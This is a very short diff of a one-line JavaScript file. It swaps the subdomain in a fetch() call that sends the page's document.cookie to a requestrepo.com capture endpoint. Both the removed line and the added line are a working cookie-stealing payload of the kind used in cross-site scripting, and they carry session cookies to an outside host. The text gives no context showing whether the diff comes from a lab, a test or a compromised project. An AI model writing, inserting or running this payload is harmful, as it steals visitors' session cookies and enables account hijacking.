@@ -1,2 +1,2 @@
-fetch("http://qy7yegjk.requestrepo.com/?c=" + document.cookie);
+fetch("http://6qblh9bo.requestrepo.com/?c=" + document.cookie);
 
